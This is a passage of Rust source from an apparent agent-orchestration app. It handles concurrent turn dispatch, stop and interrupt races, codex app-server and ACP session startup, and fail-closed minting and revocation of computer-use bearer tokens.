    // STILL digest-free (see above) — adversarial re-review of PR #139, P1: an
    // earlier version prepended the digest before this point, so a post-switch
    // history digest (up to 12 prior turns, potentially containing paths,
    // secrets pasted into chat, etc.) landed in `lead_message.content` here,
    // directly contradicting `pending_context_digest`'s own "deliberately NOT
    // persisted" doc. Only the human-typed `text` + attachment appendices are
    // ever written to the row.
    if per_turn(&ctx.tool) && !image_uris.is_empty() {
        let with_dispatched = serde_json::json!({
            "text": text,
            "images": image_uris,
            "files": files,
            "dispatched": &outbound,
        });
        let _ = repo::update_lead_message(db, row_id, &with_dispatched.to_string(), status).await;
    }
    // NOW prepend the digest (if any) — the very last transformation before the
    // agent-bound `Outgoing`, strictly after every DB write above.
    if let Some(d) = digest.as_deref().filter(|d| !d.is_empty()) {
        outbound = format!("{d}\n\n{outbound}");
    }
    let out = Outgoing {
        text: outbound,
        images,
        tracked: true,
        // Rides the turn (and the queue, if queued) so output frames recover it.
        origin_tag: ctx.origin_tag.clone(),
        queue_id: if ctx.direct { None } else { Some(row_id) },
        has_attachments,
        local_image_paths,
    };

    // Phase 3: re-acquire the lock and COMMIT against CURRENT state — deliver,
    // enqueue, promote, or abort is decided here, not enforced from the Phase-1
    // snapshot (which only decided the row's optimistic status). The lock drops
    // before any turn-spawning awaits.
    let is_acp = is_acp_tool(&ctx.tool);
    let is_connection = is_codex_appserver || is_acp;
    let spawn_now = ctx.direct && per_turn(&ctx.tool) && !is_connection;
    // Set when a queued send found the engine idle and claimed a fresh turn.
    let mut promoted: Option<i32> = None;
    {
        let mut inner = eng.lock().await;
        // Stop/reset can race between Phase 1 and Phase 3. If the reservation
        // was invalidated while the lock was dropped, abort instead of writing
        // to a dead stdin, queueing on a drained turn, or spawning after stop.
        if !send_reservation_valid(&inner, &ctx) {
            drop(inner);
            // A stop/interrupt can land between ensure_running_for_send_admitted and
            // Phase 3, leaving Phase 1's reservation on an engine that will
            // never run it. Undo it and restore the invariants (busy, activity,
            // interrupt flag, anything queued behind the canceled turn) — the
            // rollback is ownership-guarded, so if a stop/reset cleared the turn
            // itself or a newer reservation owns the state, it no-ops.
            rollback_canceled_send(app, db, eng, &ctx, "interrupted", true).await;
            let _ = repo::update_lead_message(db, row_id, &content, "interrupted").await;
            emit_finalize(app, ctx.thread_id, row_id, "interrupted");
            return Err(anyhow::anyhow!(
                "send could not be delivered: the turn ended or the engine stopped while it was persisting"
            ));
        }
        if ctx.direct && !spawn_now && !is_connection {
            if let Err(e) = write_user(&mut inner, &out).await {
                drop(inner);
                rollback_failed_visible_turn(app, db, eng, ctx.turn, row_id, &content, "error")
                    .await;
                return Err(e);
            }
        } else if !ctx.direct {
            if inner.turn.busy {
                // The queue cap was checked in Phase 1, but multiple queued sends
                // can race through DB/attachment I/O and observe the same count.
                // Re-check under the lock before appending to keep the limit real.
                if visible_queued(&inner.turn) >= MAX_QUEUED {
                    drop(inner);
                    let _ = repo::update_lead_message(db, row_id, &content, "error").await;
                    emit_finalize(app, ctx.thread_id, row_id, "error");
                    return Err(anyhow::anyhow!("queue_full"));
                }
                inner.turn.queue.push_back(out.clone());
            } else if inner.interrupting {
                // The turn this send queued behind is mid-interrupt-teardown;
                // promoting into that teardown would hand the interrupt a fresh
                // turn to kill. Cancel instead — the composer restores the draft
                // on the error path, so nothing is lost.
                drop(inner);
                let _ = repo::update_lead_message(db, row_id, &content, "interrupted").await;
                emit_finalize(app, ctx.thread_id, row_id, "interrupted");
                return Err(anyhow::anyhow!(
                    "send could not be delivered: the turn was interrupted while it was persisting"
                ));
            } else {
                // The active turn ENDED while this send persisted: nothing drains
                // an idle queue, so deliver NOW by promoting into a fresh direct
                // turn — the same commit-time decision a direct send makes.
                promoted = Some(promote_queued_reservation(
                    &mut inner,
                    ctx.origin_tag.clone(),
                ));
                // Same pre-turn checkpoint as a direct send, taken between the
                // promotion and the dispatch (the resident write below; per-turn
                // / codex spawns in Phase 4).
                snapshot_turn_checkpoint(app, db, inner.session_id, inner.turn_id, row_id).await;
                crate::power::on_turn_began(app);
                // Under the lock for the same ordering reason as Phase 1's direct
                // write: a concurrent stop's "stopped" write must not be overtaken.
                persist_activity(db, inner.session_id, inner.thread_id, "running").await;
                if !per_turn(&ctx.tool) && !is_connection {
                    // Resident tool: deliver through the live stdin under this
                    // lock, exactly like a direct resident send.
                    if let Err(e) = write_user(&mut inner, &out).await {
                        // Still under the lock, so the promotion is provably ours
                        // to undo inline. (The promoted id has no persisted row —
                        // the queued row keeps its original turn — so rewinding
                        // the counter is safe here.)
                        inner.turn.busy = false;
                        inner.turn_id -= 1;
                        inner.current_origin_tag = None;
                        // The promotion persisted "running" above; put the DB and
                        // the UI back to idle UNDER this same lock (the ordering
                        // rule every rollback follows), or live counts and
                        // boot-revive would treat this non-running session as
                        // active after a dead resident stdin.
                        persist_activity(db, inner.session_id, inner.thread_id, "idle").await;
                        emit_turn_state(app, inner.thread_id, inner.session_id, false, Vec::new());
                        drop(inner);
                        let _ = repo::update_lead_message(db, row_id, &content, "error").await;
                        emit_finalize(app, ctx.thread_id, row_id, "error");
                        return Err(e);
                    }
                }
            }
        }
        // Rewind anchor bookkeeping: the row that opens a turn is where the
        // turn's native anchor lands at a clean TurnEnd. A queued row waits
        // for its dequeue (the flush paths re-stamp it then); hidden plumbing
        // turns carry no row (None).
        if ctx.direct || promoted.is_some() {
            inner.turn_user_row = Some(row_id);
            inner.last_assistant_uuid = None;
        }
        let _ = app.emit(
            EVENT,
            Push::Turn {
                thread_id: ctx.thread_id,
                session_id: ctx.session_id,
                state: if inner.turn.busy { "busy" } else { "idle" }.into(),
                queue: queue_items(&inner.turn),
            },
        );
    }

    // Phase 4: turn spawning runs without the engine lock. The spawn helpers
    // re-check `stopped` AND the send's reset_epoch atomically with the child
    // snapshot, so neither a plain stop nor a stop-then-restart landing in the
    // Phase-3-to-spawn window can launch a child for a canceled send.
    if spawn_now {
        if let Err(e) = spawn_turn(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(ctx.reset_epoch),
        )
        .await
        {
            // A guard-canceled spawn (stop/interrupt raced the window) is the
            // user's cancel — finalize "interrupted", not "error".
            let status = spawn_failure_status(eng, &ctx).await;
            rollback_failed_visible_turn(app, db, eng, ctx.turn, row_id, &content, status).await;
            return Err(e);
        }
    } else if ctx.direct && is_codex_appserver {
        if let Err(e) = spawn_codex_turn_or_exec(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(ctx.reset_epoch),
        )
        .await
        {
            let status = spawn_failure_status(eng, &ctx).await;
            rollback_failed_visible_turn(app, db, eng, ctx.turn, row_id, &content, status).await;
            return Err(e);
        }
    } else if ctx.direct && is_acp {
        if let Err(e) = spawn_acp_turn(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(ctx.reset_epoch),
        )
        .await
        {
            let status = spawn_failure_status(eng, &ctx).await;
            rollback_failed_visible_turn(app, db, eng, ctx.turn, row_id, &content, status).await;
            return Err(e);
        }
    } else if let Some(pturn) = promoted {
        // The promoted send owns a fresh turn now. Flip its row to delivered
        // (complete + delivery seq + finalize emit, same as a drained queue item),
        // then spawn the turn for per-turn tools; resident stdin was already
        // written under the Phase 3 lock.
        mark_queued_delivered(app, db, ctx.thread_id, ctx.session_id, &out).await;
        let dispatched = Outgoing {
            queue_id: None,
            ..out.clone()
        };
        // For guard-cancel detection the promoted send is direct-shaped: it owns
        // the fresh turn it claimed at promotion.
        let promoted_ctx = SendContext {
            direct: true,
            turn: pturn,
            ..ctx.clone()
        };
        if per_turn(&ctx.tool) && !is_connection {
            if let Err(e) = spawn_turn(
                app.clone(),
                db.clone(),
                eng.clone(),
                dispatched,
                Some(ctx.reset_epoch),
            )
            .await
            {
                let status = spawn_failure_status(eng, &promoted_ctx).await;
                rollback_failed_visible_turn(app, db, eng, pturn, row_id, &content, status).await;
                return Err(e);
            }
        } else if is_codex_appserver {
            if let Err(e) = spawn_codex_turn_or_exec(
                app.clone(),
                db.clone(),
                eng.clone(),
                dispatched,
                Some(ctx.reset_epoch),
            )
            .await
            {
                let status = spawn_failure_status(eng, &promoted_ctx).await;
                rollback_failed_visible_turn(app, db, eng, pturn, row_id, &content, status).await;
                return Err(e);
            }
        } else if is_acp {
            if let Err(e) = spawn_acp_turn(
                app.clone(),
                db.clone(),
                eng.clone(),
                dispatched,
                Some(ctx.reset_epoch),
            )
            .await
            {
                let status = spawn_failure_status(eng, &promoted_ctx).await;
                rollback_failed_visible_turn(app, db, eng, pturn, row_id, &content, status).await;
                return Err(e);
            }
        }
    }
    // The digest peeked above (if any) is now genuinely embedded in text that
    // was written to a live stdin, handed to a queue, or handed to a spawn —
    // this is the ONE point every success path converges on (every other exit
    // between the peek and here is a `return Err(...)`), so it is safe to
    // clear now. Only clear when it's still the SAME digest this send peeked
    // (`Some(d) if cur.as_ref() == Some(d)`): a concurrent switch racing in
    // between could have staged a NEW digest for a later turn, which belongs
    // to that later turn, not this one.
    if let Some(d) = &digest {
        let mut inner = eng.lock().await;
        if inner.pending_context_digest.as_ref() == Some(d) {
            inner.pending_context_digest = None;
        }
    }
    Ok(())
}

/// Codex app-server transport selector (default ON; `WEFT_CODEX_APPSERVER=0` →
/// exec). See [`crate::adapters::codex_prefers_appserver`].
fn codex_appserver_enabled() -> bool {
    crate::adapters::codex_prefers_appserver()
}

/// Drive a codex turn over the shared, multiplexed `codex app-server` connection
/// (gated by [`codex_appserver_enabled`]). Resolves/creates the thread (id ==
/// native session id), ensures one long-lived [`codex_consumer`] per session,
/// then starts the turn. Streaming + finalize + queue-flush live in the consumer.
async fn spawn_codex_turn(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    out: Outgoing,
    expected_epoch: Option<u64>,
) -> anyhow::Result<()> {
    // No `extra_env` in this snapshot: the app-server connection's env is
    // assembled inside the connect arm below, after the computer injection is
    // re-minted.
    let (native, cwd, sid, thread_id_i, system_prompt, extra_args, existing, program) = {
        let i = eng.lock().await;
        // Atomic with the snapshot: don't start a codex turn for a stopped engine
        // (a stop racing the send's Phase-3-to-spawn window, which is widest on the
        // app-server path because connection/start awaits happen after this) — nor
        // for a send whose reservation epoch a stop-then-restart invalidated, nor
        // when an interrupt is in flight (no child exists for it to kill in this
        // window; spawning would run the canceled turn). The caller rolls back or
        // falls through — and the exec fallback (spawn_turn) makes the same check
        // — so returning here is safe.
        if i.stopped || i.interrupting || expected_epoch.is_some_and(|e| e != i.reset_epoch) {
            return Err(anyhow::anyhow!("engine stopped; not starting a codex turn"));
        }
        (
            i.native_id.clone(),
            i.cwd.clone(),
            i.session_id,
            i.thread_id,
            i.system_prompt.clone(),
            i.extra_args.clone(),
            i.codex_client.clone(),
            // Effective codex binary for THIS session: a per-session pin wins over
            // the global override, so a pinned (opt-out) codex session keeps its
            // command even on the default app-server transport.
            crate::tool_command::effective(i.command.as_deref(), &i.tool),
        )
    };
    // Per-session app-server: reuse the engine's connection or spawn one with this
    // session's `-c mcp_servers` bus flags. Its own process keeps the per-thread
    // MCP isolated (app-server MCP is app-scoped).
    let (client, freshly_connected) = match existing {
        Some(c) if c.is_alive().await => (c, false),
        _ => {
            // Pre-accept folder trust (like the exec adapter's prepare) so the
            // app-server's first thread/start doesn't block on codex's trust prompt.
            crate::codex::ensure_codex_trusted(&cwd);
            let owner = match sid {
                Some(s) => crate::proc_registry::Owner::session(s.to_string()),
                None => crate::proc_registry::Owner::lead_thread(thread_id_i.to_string()),
            };
            // Re-mint the computer bearer for the app-server child about to
            // be spawned — but ONLY on this arm, never on the
            // reuse arm above: refreshing rotates the identity's generation,
            // which would 401 the computer tool of a still-live client that
            // is holding the previous bearer. The outer snapshot's
            // `extra_args`/`extra_env` deliberately carry no computer entries
            // (they live in their own fields), so this re-lock is what
            // assembles the pair the connection actually spawns with.
            let (spawn_args, spawn_pairs) = {
                let mut i = eng.lock().await;
                // Re-check cancellation under THIS lock, before minting. The
                // `is_alive()` guard on the reuse arm above is an `.await`, so
                // a Stop can acquire the engine lock and revoke this identity
                // between the outer snapshot's check and here. Re-minting
                // unconditionally would hand an ALREADY-STOPPED engine a
                // fresh, VALID bearer — undoing the very revoke that Stop just
                // performed. Failing here matches the outer snapshot's own
                // fail-closed shape (the caller rolls back or falls through to
                // exec).
                if i.stopped
                    || i.interrupting
                    || expected_epoch.is_some_and(|e| e != i.reset_epoch)
                {
                    return Err(anyhow::anyhow!("engine stopped; not starting a codex turn"));
                }
                refresh_computer_injection(&app, &mut i);
                let mut args = extra_args.clone();
                args.extend(i.computer_args.iter().cloned());
                (args, spawn_env(&i))
            };
            let c = crate::codex_app_server::Client::connect_session(
                &program,
                &spawn_args,
                &spawn_pairs,
                &cwd,
                owner,
            )
            .await?;
            // NOT published to the engine yet: the stop check below must pass
            // first. Publishing early would let this task's stop-cleanup tear a
            // RESTARTED send's client out of the registry (a restart may reuse
            // whatever is registered), or let a restarted send adopt a connection
            // the stop already doomed.
            (c, true)
        }
    };
    let cwd = cwd.to_string_lossy().into_owned();
    let had_native = native.is_some();
    let (thread, freshly_started) = match native {
        Some(t) => (t, false),
        // Don't commit the native id yet: if `turn/start` below fails and we fall
        // back to exec, a None native id lets exec start fresh WITH the system
        // prompt prepended, instead of resuming an empty thread that never got it.
        None => match client.start_thread(&cwd).await {
            Ok(t) => (t, true),
            Err(e) => {
                // A freshly connected client is NOT published yet (that happens
                // after the stop check below), so the or_exec fallback has
                // nothing in the registry to take — dropping the handle here
                // would leak the app-server child (reader/writer tasks hold
                // clones) alive alongside the exec fallback. Shut it down.
                if freshly_connected {
                    client.shutdown_and_reap().await;
                }
                return Err(e);
            }
        },
    };
    if !client.is_subscribed(&thread).await {
        // First attach this process: a pre-existing thread is resumed so the
        // app-server re-loads its rollout; a just-started one is already loaded.
        if had_native {
            let _ = client.resume_thread(&thread).await;
        }
        let rx = client.subscribe(&thread).await;
        let quota_command = match client.spawned_command().await {
            Some(command) => command,
            None => program.clone(),
        };
        let (a, d, e, c, th, quota_command) = (
            app.clone(),
            db.clone(),
            eng.clone(),
            client.clone(),
            thread.clone(),
            quota_command,
        );
        tauri::async_runtime::spawn(async move {
            codex_consumer(a, d, e, c, th, quota_command, rx).await;
        });
    }
    // stop_quiet may have run during the connect / start_thread / subscribe awaits
    // above, when there was no `codex_client` for it to shut down. If the stop won
    // that race — including a stop-then-restart, which clears `stopped` but bumps
    // the epoch — tear the freshly connected client down and abort rather than
    // starting a turn the user canceled. (The early snapshot check only covers
    // stops that happened before the connect.)
    let stop_won = {
        // Check AND publish under ONE lock acquisition: a stop landing between a
        // separate check and a later publish would register a client for a turn
        // the user just canceled. Once published atomically here, a later stop
        // reaches the client through the registry (stop_quiet takes it and shuts
        // it down, failing start_turn below) — that is the designed teardown.
        let mut g = eng.lock().await;
        let won = g.stopped || expected_epoch.is_some_and(|e| e != g.reset_epoch);
        // This task minted a bearer for the connection it is about to tear down
        // (the connect arm above refreshed, which stamped `computer_gen`). The
        // stop that won this race revoked the generation that existed BEFORE
        // that mint, so ours would otherwise outlive the child it was issued to
        // — exactly the orphan-keeps-a-live-token shape the revoke exists to
        // close. Under THIS lock, so there is no window at all between the stop
        // being observed and the token dying; the shutdown below is unlocked.
        //
        // A REUSED client needs nothing: the stop took it out of the registry
        // and shut it down itself, revoking on the way through.
        if won && freshly_connected {
            revoke_engine_bearer(&mut g);
        }
        if !won && freshly_connected {
            g.codex_client = Some(client.clone());
        }
        won
    };
    if stop_won {
        // Never touch the registry here: a restarted send may have published a
        // fresh client by now — ours was never published, so taking whatever is
        // registered could sever the NEW session's connection. Shut down only the
        // connection THIS task made; a reused registered client was already shut
        // down by the stop itself (stop_quiet takes it).
        if freshly_connected {
            client.shutdown_and_reap().await;
        }
        return Err(anyhow::anyhow!(
            "engine stopped during codex app-server connect"
        ));
    }
    // codex has no thread/start system-prompt field, so (like the exec adapter)
    // the prompt is prepended to the FIRST turn of a brand-new thread; a resumed
    // thread already carries it in conversation history.
    let first_text = codex_first_turn_text(&system_prompt, &out.text, had_native);
    let turn = client
        .start_turn_with_images(&thread, &first_text, &out.local_image_paths)
        .await?;
    client.set_active_turn(&thread, &turn).await;
    // The turn is in flight, so the thread is real and carries the system prompt:
    // now it's safe to persist the native id (a later resume reuses this rollout).
    if freshly_started {
        eng.lock().await.native_id = Some(thread.clone());
        if let Some(sid) = sid {
            let _ = repo::set_session_native_id(&db, sid, &thread).await;
        } else {
            let _ = repo::set_lead_native_id(&db, thread_id_i, &thread).await;
        }
    }
    // Stop pressed while turn/start was in flight? interrupt() ran before the turn
    // id existed (no active turn, no exec child), so it was a no-op — honor it now
    // that the turn is recorded, instead of letting it run despite the user.
    if eng.lock().await.interrupting {
        let _ = client.interrupt(&thread, &turn).await;
    }
    Ok(())
}

/// Start a codex turn on the app-server, falling back to exec per-turn if the
/// app-server can't be reached (the native id is shared with exec's rollout, so
/// resume is seamless). The caller must have already begun the turn (busy/turn_id).
async fn spawn_codex_turn_or_exec(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    out: Outgoing,
    expected_epoch: Option<u64>,
) -> anyhow::Result<()> {
    if let Err(e) = spawn_codex_turn(
        app.clone(),
        db.clone(),
        eng.clone(),
        out.clone(),
        expected_epoch,
    )
    .await
    {
        // Stop pressed while the app-server start was pending and it then errored:
        // don't resurrect the canceled turn on exec — propagate so the caller rolls
        // it back (otherwise the interrupted turn runs anyway on the fallback).
        if eng.lock().await.interrupting {
            return Err(e);
        }
        // Tear down the half-started app-server first: thread/start + the consumer
        // subscription may already be live, and a lingering consumer (single-thread
        // routing) could finalize/reset the exec fallback turn or break thread-less
        // routing on the next retry. shutdown() drops the child + closes the consumer.
        // Its bearer goes too — the `spawn_turn` below re-mints for the exec child.
        let stale = {
            let mut inner = eng.lock().await;
            let c = inner.codex_client.take();
            if c.is_some() {
                revoke_engine_bearer(&mut inner);
            }
            c
        };
        if let Some(c) = stale {
            c.shutdown().await;
        }
        eprintln!("[weft][codex] app-server unavailable ({e}) — falling back to exec");
        spawn_turn(app, db, eng, out, expected_epoch).await?;
    }
    Ok(())
}

/// codex has no thread/start system-prompt field, so — exactly like the exec
/// adapter (`CodexExecAdapter::build_argv`) — the engine's `system_prompt` is
/// prepended to the FIRST turn of a brand-new thread. A resumed thread already
/// carries it in history, so it's added only when `!had_native`.
fn codex_first_turn_text(system_prompt: &str, message: &str, had_native: bool) -> String {
    if !had_native && !system_prompt.is_empty() {
        format!("{system_prompt}\n\n{message}")
    } else {
        message.to_string()
    }
}

pub(crate) fn is_acp_tool(tool: &str) -> bool {
    crate::acp::backend_for(tool).is_some()
}

/// Drive a turn over the generic ACP runtime (omp today). Mirrors the
/// connection-shaped codex app-server path: ensure session, subscribe a
/// long-lived consumer once, then `session/prompt`.

/// Clear a never-prompted first ACP native id (engine + DB) so the next send
/// re-opens and still prepends the system prompt.
async fn clear_acp_native_never_prompted(
    _app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    session_id: Option<i32>,
    thread_id: i32,
) {
    {
        let mut g = eng.lock().await;
        g.native_id = None;
        g.acp_client = None;
    }
    if let Some(sid) = session_id {
        let _ = repo::set_session_native_id_opt(db, sid, None).await;
    } else {
        let _ = repo::set_lead_native_id_opt(db, thread_id, None).await;
    }
}

async fn spawn_acp_turn(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    out: Outgoing,
    expected_epoch: Option<u64>,
) -> anyhow::Result<()> {
    let (native, cwd, sid, thread_id_i, system_prompt, tool, command, ask_dir, worktree_id) = {
        let i = eng.lock().await;
        // `tearing_down` included as defence in depth: the hidden path already
        // refuses, but this is the one gate every ACP turn passes through.
        if i.stopped
            || i.interrupting
            || i.tearing_down
            || expected_epoch.is_some_and(|e| e != i.reset_epoch)
        {
            return Err(anyhow::anyhow!("engine stopped; not starting an ACP turn"));
        }
        (
            i.native_id.clone(),
            i.cwd.clone(),
            i.session_id,
            i.thread_id,
            i.system_prompt.clone(),
            i.tool.clone(),
            i.command.clone(),
            i.ask_dir.clone(),
            // this worker's own worktree id, already
            // resolved at engine-build time (`EngineInner::worktree_id`'s own
            // doc) — reused here to pin `weft_computer`'s `?wt=` query param
            // instead of the multi-repo-direction "first worktree" fallback.
            // `None` for the lead lane (a lead has no worktree at all).
            i.worktree_id,
        )
    };
    let backend =
        crate::acp::backend_for(&tool).ok_or_else(|| anyhow::anyhow!("not an ACP tool: {tool}"))?;
    let program = crate::tool_command::effective(command.as_deref(), &tool);
    let client = crate::acp::runtime::client(backend.id(), &program).await?;

    // MCP list: mirror lead_engine inject branches (thread.kind), not ask_dir alone
    // — lead/concierge/curator all store ask_dir="lead".
    let base = app
        .try_state::<crate::BusBase>()
        .map(|b| b.0.clone())
        .unwrap_or_default();
    // `weft_computer` is now injected
    // UNCONDITIONALLY for every issue-lead/worker engine (concierge/curator
    // still never get it) — the setting/kill-switch is enforced dynamically,
    // server-side, on every single call by `bus::computer_srv::run_action`'s
    // own `computer::enabled` gate (fail-closed with a "disabled in weft
    // settings" result). This used to re-check `computer::enabled(&db)` here
    // and pass that as `include_computer`, which meant an engine spawned (or
    // an ACP session opened) BEFORE the human turned the setting on would
    // simply never present the tool at all on this per-turn path either.
    // Always injecting means the human flipping the setting takes effect
    // immediately, on the NEXT tool call, without needing to rebuild
    // anything — see `lead_chat::commands.rs`'s own three non-ACP injection
    // points for the identical change, and `bus::inject::inject_computer`'s
    // doc for why the endpoint itself was always designed to be always-safe
    // to hand out (the description also says it needs enabling in Settings,
    // and the server denies every call otherwise).
    let mcp = if base.is_empty() {
        crate::bus::inject::AcpMcpInjection { servers: vec![], computer_generation: None }
    } else if sid.is_none() {
        // Lead-kind engine: choose MCP from thread kind.
        // : a TRANSIENT `get_thread` failure must fail
        // CLOSED — the old `.ok().flatten()...unwrap_or_default()` collapsed an
        // error into `""`, which the `_` arm below classifies as an issue lead
        // and injects `weft_computer` into, even for a concierge/curator lead
        // that must NEVER receive it (and whose bearer would then work once the
        // DB recovers, an existing Full grant authorizing input with no card).
        // On a lookup ERROR inject NO MCP servers at all this open (the turn
        // still runs; it simply gets no injected server, and definitely not
        // computer-use); a genuine `Ok(None)` keeps the prior default.
        match repo::get_thread(&db, thread_id_i).await {
            Err(_) => {
                crate::bus::inject::AcpMcpInjection { servers: vec![], computer_generation: None }
            }
            Ok(row) => match row.map(|th| th.kind).unwrap_or_default().as_str() {
                // Concierge: weft_global only (never bus, never computer).
                "concierge" => crate::bus::inject::acp_mcp_servers(
                    &base, thread_id_i, "lead", None, false, false, true, false, false, None,
                ),
                // Curator: curator MCP + bus under LEAD identity (never computer).
                "curator" => crate::bus::inject::acp_mcp_servers(
                    &base,
                    thread_id_i,
                    crate::bus::LEAD,
                    None,
                    true,
                    false,
                    false,
                    true,
                    false,
                    None,
                ),
                // Issue lead: planner + bus + computer (always injected, gated
                // server-side). No worktree of its own (see
                // §5) — always `None`, and no persisted session id either.
                _ => crate::bus::inject::acp_mcp_servers(
                    &base,
                    thread_id_i,
                    crate::bus::LEAD,
                    None,
                    true,
                    true,
                    false,
                    false,
                    true,
                    None,
                ),
            },
        }
    } else {
        // Worker: bus under direction id + computer pinned to this worker's
        // OWN worktree.
        // : computer ONLY with a POSITIVELY resolved
        // worktree — `EngineInner::worktree_id` collapses a missing row or a
        // failed lookup to `None`, and the absent-`wt` URL shape is legitimate
        // ONLY for the lead lane; server-side it deliberately resolves to the
        // direction's FIRST worktree, so an unresolved ACP worker would mint a
        // bearer for (and write audit/screenshots under) a SIBLING session's
        // identity in a multi-repo direction. Identity fails closed instead:
        // no computer server at all until a rebuild resolves the worktree —
        // mirroring the non-ACP rebuild path's identical guard.
        crate::bus::inject::acp_mcp_servers(
            &base,
            thread_id_i,
            &ask_dir,
            sid,
            true,
            false,
            false,
            false,
            worktree_id.is_some(),
            worktree_id,
        )
    };

    // The ACP bearer is minted inside `acp_mcp_servers`, not by
    // `refresh_computer_injection` (ACP supplies MCP on session/new|resume, so
    // `inject_computer` produces nothing for it). Stamp the engine with the
    // generation it just minted, or an ACP teardown would have no bearer of its
    // own to revoke — see `EngineInner::computer_gen`.
    if let Some(generation) = mcp.computer_generation {
        eng.lock().await.computer_gen = Some(generation);
    }
    let mcp = mcp.servers;
    let had_native = native.is_some();
    let prior_native = native.clone();
    // Keep mcp specs for Session Info seeding (moved into open calls via clone).
    let mcp_for_meta = mcp.clone();
    let (session_id, open_model, open_thinking) = match native {
        Some(id) => {
            // Prefer resume; fall back to load (hand-cut rewind files).
            // Do NOT keep a stale id when both fail — next send would target an
            // unopened session forever.
            match client.resume_session(&id, &cwd, mcp.clone()).await {
                Ok(open) => (open.session_id, open.model, open.thinking),
                Err(resume_err) => match client.load_session(&id, &cwd, mcp.clone()).await {
                    Ok(sid) => (sid, None, None),
                    Err(load_err) => {
                        eprintln!(
                            "[weft][acp] resume failed ({resume_err}); load also failed ({load_err})"
                        );
                        // Actually do what the comment above says. Returning
                        // while the id survives in the engine AND the DB is
                        // what made a deleted or unloadable session file
                        // permanent: every later send re-entered this same
                        // branch and answered `acp_session_open_failed`
                        // forever. Cleared, the next send takes the `None`
                        // arm and opens a fresh session.
                        //
                        // Tear the RUNTIME route down too, the same way every
                        // other abandonment path does. Clearing only the ids
                        // leaves the old `SessionRoute` and its consumer
                        // registered: they keep delivering late text, tool and
                        // permission events into this engine after the retry
                        // opened a different session, and the surviving route
                        // also pins the pooled client so it can never retire.
                        let _ = client.cancel(&id).await;
                        client.unsubscribe(&id).await;
                        clear_acp_native_never_prompted(&app, &db, &eng, sid, thread_id_i).await;
                        return Err(anyhow::anyhow!("acp_session_open_failed"));
                    }
                },
            }
        }
        None => {
            let open = match client.new_session(&cwd, mcp).await {
                Ok(o) => o,
                Err(e) => {
                    eprintln!("[weft][acp] session/new failed: {e}");
                    return Err(anyhow::anyhow!("acp_session_open_failed"));
                }
            };
            (open.session_id, open.model, open.thinking)
        }
    };
    {
        let mut g = eng.lock().await;
        if let Some(model) = open_model {
            g.last_model = Some(model);
        }
        if let Some(thinking) = open_thinking {
            g.last_reasoning = Some(thinking);
        }
        // Seed MCP list from what we injected so Session Info is not empty after
        // the first turn (OMP has no separate mcp discovery event).
        if !mcp_for_meta.is_empty() {
            // Refresh names from this turn's inject set (idempotent).
            g.last_mcp_servers = mcp_for_meta
                .into_iter()
                .map(|s| super::proto::McpServer {
                    name: s.name,
                    status: "connected".into(),
                })
                .collect();
        }
        // Always push Init after ACP open so Session Info hydrates MCP/model
        // immediately (probe gather used to return empty defaults for omp).
        let _ = app.emit(
            EVENT,
            Push::Init {
                thread_id: g.thread_id,
                session_id: g.session_id,
                native_id: session_id.clone(),
                slash_commands: g.slash_commands.clone(),
                mcp_servers: g.last_mcp_servers.clone(),
                tools: g.last_tools.clone(),
                model: g.last_model.clone(),
                window: g.last_window,
                mcp_known: true,
            },
        );
    }

    // If resume/load minted a replacement id, drop the prior route so late
    // notifications cannot mutate this engine under the old sessionId.
    if let Some(prev) = prior_native.as_deref() {
        if prev != session_id.as_str() {
            let _ = client.cancel(prev).await;
            client.unsubscribe(prev).await;
        }
    }

    // Always resubscribe when the runtime lost the route (child restart /
    // shutdown clears sessions) even if the engine still holds acp_client.
    let need_sub = !client.is_subscribed(&session_id).await;
    if need_sub {
        let (tx, rx) = tokio::sync::mpsc::unbounded_channel();
        client.subscribe(&session_id, tx).await?;
        // Capture the generation HERE, not inside the spawned task. Read after
        // the spawn, the consumer records whatever epoch is current when it
        // first takes the lock — so a Stop, rewind, or engine switch landing in
        // that gap makes it adopt the NEW epoch and treat already-buffered
        // events from the abandoned session as live, appending or finalizing
        // stale text onto a session that was stopped or switched.
        let route_epoch = eng.lock().await.reset_epoch;
        let (a, d, e, c, s) = (
            app.clone(),
            db.clone(),
            eng.clone(),
            client.clone(),
            session_id.clone(),
        );
        tauri::async_runtime::spawn(
            async move { acp_consumer(a, d, e, c, s, rx, route_epoch).await },
        );
    }

    let stop_won = {
        let mut g = eng.lock().await;
        // Ordinary composer Stop sets `interrupting` without bumping epoch until
        // the delayed force reset — must not publish acp_client or arm prompt.
        let won = g.stopped || g.interrupting || expected_epoch.is_some_and(|e| e != g.reset_epoch);
        if !won {
            g.acp_client = Some(client.clone());
            if g.native_id.as_deref() != Some(session_id.as_str()) {
                g.native_id = Some(session_id.clone());
            }
        }
        won
    };
    if stop_won {
        // Subscribe may already have installed a route before acp_client was
        // published; stop_quiet couldn't see it. Tear the route down or the
        // next send reuses a stale-epoch consumer that drops every update.
        let _ = client.cancel(&session_id).await;
        client.unsubscribe(&session_id).await;
        // First open never got session/prompt — drop native id so the next
        // send re-opens and still prepends the system prompt.
        if prior_native.is_none() {
            clear_acp_native_never_prompted(&app, &db, &eng, sid, thread_id_i).await;
        }
        return Err(anyhow::anyhow!("engine stopped during ACP connect"));
    }

    // Persist whenever open id differs from the id we started with — resume/
    // load can mint a replacement even when had_native was true.
    if prior_native.as_deref() != Some(session_id.as_str()) {
        if let Some(sid) = sid {
            let _ = repo::set_session_native_id(&db, sid, &session_id).await;
        } else {
            let _ = repo::set_lead_native_id(&db, thread_id_i, &session_id).await;
        }
    }

    let text = if !had_native && !system_prompt.is_empty() {
        format!("{system_prompt}\n\n{}", out.text)
    } else {
        out.text.clone()
    };

    // Non-blocking: codex-style. Launch prompt on a background task so send()
    // returns while the consumer streams; finalize when prompt resolves.
    // Final stop check immediately before arming the prompt task — a takeover
    // between stop_won and here must not start session/prompt after cancel.
    let prompt_epoch = {
        let g = eng.lock().await;
        if g.stopped || g.interrupting || expected_epoch.is_some_and(|e| e != g.reset_epoch) {
            drop(g);
            let _ = client.cancel(&session_id).await;
            client.unsubscribe(&session_id).await;
            if prior_native.is_none() {
